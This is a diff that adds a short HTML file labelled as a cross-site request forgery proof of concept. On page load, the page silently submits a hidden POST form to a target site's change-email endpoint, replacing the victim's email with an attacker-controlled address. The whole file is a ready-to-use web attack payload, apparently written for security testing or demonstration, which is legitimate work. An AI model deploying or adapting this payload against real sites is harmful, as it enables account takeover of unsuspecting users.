@@ -1,0 +1,9 @@
+<!-- CSRF PoC: Auto-submitting malicious form -->
+<html>
+  <body onload="document.forms[0].submit()">
+    <h3>CSRF Attack PoC</h3>
+    <form action="http://targetsite.com/change-email" method="POST">
+      <input type="hidden" name="email" value="attacker@example.com" />
+    </form>
+  </body>
+</html>
